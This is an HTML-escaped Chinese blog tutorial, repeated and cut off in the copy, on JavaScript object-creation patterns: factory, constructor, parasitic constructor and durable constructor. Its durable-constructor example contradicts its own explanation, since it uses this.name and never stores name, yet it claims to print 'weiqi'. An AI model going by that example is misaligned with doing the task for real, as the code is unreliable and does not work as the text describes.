white-space: normal;\"><strong><span style=\"color: rgb(247, 92, 47);\">六、寄生构造函数模式</span></strong></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通常，在上述几种模式都不适合的情况下可以使用寄生构造函数模式。这种模式的基本思想是创建一个函数，该函数的作用仅仅是封装创建对象的代码，然后再返回新创建的对象，但从表面看，这个函数又很像典型的构造函数。来看一个例子：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">Person</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>();<br>&nbsp; o.name = name;<br>&nbsp; o.age = age;<br> &nbsp; &nbsp;<br>&nbsp; o.job = job;<br> &nbsp; &nbsp;<br>&nbsp; o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><br>&nbsp; alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);<br> &nbsp; &nbsp;} &nbsp; &nbsp;<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"> &nbsp; &nbsp; &nbsp;return</span> o;<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“wei”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">29</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“banzhuan”</span>);<br>person.sayName(); &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//“wei”</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style=\"color: rgb(0, 128, 255);\">Person</span>函数创建了一个对象，并以相应的属性和方法初始化该对象，然后返回了这个对象。除了使用<span style=\"color: rgb(0, 128, 255);\">new</span>操作符把使用的包装函数叫做构造函数之外，这个模式和工厂模式并没有多大的区别。构造函数在不返回值的情况下，会默认返回新对象的实例。而通过在构造函数的末尾添加一个<span style=\"color: rgb(0, 128, 255);\">return</span>语句，可以重写调用构造函数时返回的值。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个模式可以在特殊的情况下来为对象创建构造函数。假设我们想创建一个具有额外方法的特殊数组。由于不能直接修改Array构造函数，因此可以使用这个模式：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">SpecialArray</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"><br> &nbsp; &nbsp;//创建数组</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"><br> &nbsp; &nbsp;var</span> values = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Array</span>(); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//添加值</span><br> &nbsp; &nbsp;values.push.apply(values,<span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">arguments</span>); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//添加方法</span><br> &nbsp; &nbsp;values.toPipedString = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><br> &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">return</span> <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.join(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“|”</span>);<br>} &nbsp; &nbsp;<br> <br> <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">&nbsp; &nbsp;//返回数组</span><br> <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; &nbsp;return</span> values;<br> }<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> colors = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> SpecialArray(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“red”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“blue”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“green”</span>);<br>console.log(colors.toPipedString());<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//red|blue|green</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，我们创建了一个名为<span style=\"color: rgb(0, 128, 255);\">SpecialArray</span>的构造函数。在这个函数的内部，首先创建了一个数组，然后<span style=\"color: rgb(0, 128, 255);\">push()</span>方法初始化了数组的值。随后又给数组实例添加了<span style=\"color: rgb(0, 128, 255);\">toPipedString()</span>方法，用来返回以竖线分隔的数组值。最后将数组以函数的形式返回。接着，我们调用了<span style=\"color: rgb(0, 128, 255);\">SpecialArray</span>构造函数，传入了初始化的值，并调用了<span style=\"color: rgb(0, 128, 255);\">toPipedString()</span>方法。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于寄生构造函数模式，有一点需要声明：首先，返回的对象与构造函数或者构造函数的原型没有任何关系；也就是说，构造函数返回的对象与在构造函数外部创建的对象没有什么不同。为此，不能依赖instanceof操作符来确定对象的类型。由于存在这一的问题，我们建议在可以使用其他模式的情况下不要使用这种模式。<br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>七、稳妥构造函数模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;道格拉斯·克拉克福德发明了JavaScript中的稳妥对象这个概念。所谓<span style=\"color: rgb(247, 92, 47);\"><strong>稳妥对象，是指没有公共属性，而且其方法也不引用this对象</strong></span>。稳妥对象最适合在一些安全环境中（这些环境会禁止使用this和new），或者在防止数据被其他应用程序改动时使用。稳妥构造函数遵循的与寄生构造函数类似的模式，但又两点不同：一是新创建对象的实例方法不引用this；二是不使用new操作符调用构造函数。按照稳妥构造函数的要求，可以将前面的<span style=\"color: rgb(0, 128, 255);\">Person</span>构造函数重写如下：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">Person</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"> &nbsp; &nbsp;<br> &nbsp; &nbsp;//创建要返回的新对象</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; &nbsp; <br>&nbsp; &nbsp;var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>(); <br> &nbsp;<br><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"> &nbsp; &nbsp;//可以在这里定义私有变量和函数 &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;//添加方法</span><br>&nbsp; &nbsp;o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span>&nbsp;<br>&nbsp; &nbsp; &nbsp;&nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);<br> &nbsp; &nbsp;<br>&nbsp; &nbsp;}; &nbsp; &nbsp;<br><br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//返回对象</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"><br>&nbsp; &nbsp;return</span> o;<br> &nbsp; &nbsp;}</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意，在以这种模式创建的对象中，除了使用<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法之外，没有其他办法访问<span style=\"color: rgb(0, 128, 255);\">name</span>的值。可以像下面使用稳妥的<span style=\"color: rgb(0, 128, 255);\">Person</span>构造函数：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person =Person(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“weiqi”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">22</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“banzhuan”</span>);<br>person.sayName(); &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//weiqi</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样，变量<span style=\"color: rgb(0, 128, 255);\">person</span>中保存的是一个稳妥对象，而除了<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法外，没有别的方式可以访问其他数据成员。即使有其他代码会给这个对象添加方法或数据成员，但也不可能有别的办法访问传入到构造函数中的原始数据。稳妥构造函数模式提供的这种安全性，使得他非常适合在某些安全执行环境–例如，ADsafe(www.adsafe.org)提供的环境下使用。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"color: rgb(247, 92, 47);\"><strong>注意：与寄生构造函数模式类似，使用稳妥构造函数模式创建的对象与构造函数之间没有什么关系，因此instanceof操作符对这种对象也没有意义。</strong></span></span></p></section></section></section></p>\n<blockquote>\n<p>转自：<a href=\"http://blog.csdn.net/u014346301/article/details/52204967\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/u014346301/article/details/52204967</a></p>\n</blockquote>\n","excerpt":"","more":"<p><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ECMA-262把<span style=\"color: rgb(0, 128, 255);\">对象</span>定义为：”无需属性的集合，其属性可以包含基本值、对象或者函数。”严格来讲，这就相当于说明对象是一组没有特定顺序的值。对象的每个属性或方法都有一个名字，而每个名字都映射到一个值。正因为这样，我们可以把ECMAScript的对象想象成散列表：无非就是一组名对值，其中值可以是数据或函数。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义对象最简单的方式就是创建一个<span style=\"color: rgb(0, 128, 255);\">Object</span>的实例，然后再为他添加属性和方法，如下所示：</span></p></section><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102);\">Object</span>();、</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person.name = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 136, 0);\">“liubei”</span>;</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person.age = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 102, 102);\">29</span>;<br>person.job = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 136, 0);\">“shayemuyou”</span>;<br><br>person.sayName = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"font-size: 12px; color: rgb(102, 0, 102);\">()</span>{<br> &nbsp; &nbsp;<br>&nbsp; alert(<span class=\"\" style=\"font-size: 12px; color: rgb(0, 0, 136);\">this</span>.name);<br>}</span></code></pre><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子创建了一个名为<span style=\"color: rgb(0, 128, 255);\">person</span>的对象，并为他添加了三个属性和一个方法。其中<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法用于显示name属性，<span style=\"color: rgb(0, 128, 255);\">this.name</span>将被解析为person.name，早期的开发人员经常使用这个模式来创建对象，后来对象字面量的方法成了创建对象的首选模式，上面的例子用对象字面量的语法可以写成如下这样：</span></p></section><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person = {<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;name:<span class=\"\" style=\"color: rgb(0, 136, 0);\">“liubei”</span>,<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;age:<span class=\"\" style=\"color: rgb(0, 102, 102);\">29</span>,<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;job:<span class=\"\" style=\"color: rgb(0, 136, 0);\">“shayemuyou”</span>,<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;sayName:<span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br> &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;}<br>}</span></code></pre><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个例子中的<span style=\"color: rgb(0, 128, 255);\">person</span>对象和前面的对象是一样的，都有相同的属性和方法。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;虽然<span style=\"color: rgb(0, 128, 255);\">Object</span>构造函数或者对象字面量的方法都可以用来创建单个对象，但是这些方法有个明显的缺点：使用同一个接口创建很多对象，会产生大量的重复代码。为了解决这个方法，人们开始使用工厂模式的一种变体。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47); font-size: 14px;\"><strong><span style=\"color: rgb(247, 92, 47);\">一、工厂模式</span></strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;工厂模式是软件工程领域一种广为人知的设计模式，这种模式抽象了创建具体对象的过程</strong></span><span style=\"color: rgb(136, 136, 136);\">。考虑到ECMAScript中无法创建类，开发人员就发明了一种函数，用函数来封装以特定接口创建对象的细节，如下所示：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">createPerson</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><br> <br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>();<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.name = name; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.age = age; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.job = job;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><br> &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);<br> &nbsp; &nbsp;<br>&nbsp; }<br> &nbsp;<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">return</span> o;<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person1 = createPerson(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“wei”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“software”</span>);<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person2 = createPerson(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“bu”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“software”</span>);</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;函数<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>能够根据接受的参数来构建一个包含所有必要信息的<span style=\"color: rgb(0, 128, 255);\">Person</span>对象。可以多次调用这个函数，每次都会返回一个包含三个属性一个方法的对象。工厂模式虽然解决了创建多个相似对象的问题，但却没有解决对象识别的问题，即怎么样知道这是哪个对象类型。</span><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>二、构造函数模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;像Array、Object这样的原生构造函数，在运行时会自动出现在执行环境中。此外，我们可以创建自定义个构造函数，从而定义自定义类型的属性和方法。例如，我们可以使用构造函数重写上个例子：</span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{<span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;<br> &nbsp; &nbsp;this</span>.name = name;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.age = age;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.job = job;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.sayName = <span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br> &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp; &nbsp;}<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0);\">“wei”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102);\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0);\">“software”</span>);<br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person2 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0);\">“bu”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102);\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0);\">“software”</span>);</span></code></pre><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style=\"color: rgb(0, 128, 255);\">Person()</span>函数取代了<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>函数，我们注意到<span style=\"color: rgb(0, 128, 255);\">Person()</span>与<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>的不同之处在于：</span></p><ul class=\"list-paddingleft-2\"><li><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">没有显式的创建对象</span></p></li><li><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">直接将属性和方法赋值给this对象</span></p></li><li><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">没有return语句&nbsp;</span></p></section></li></ul><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: 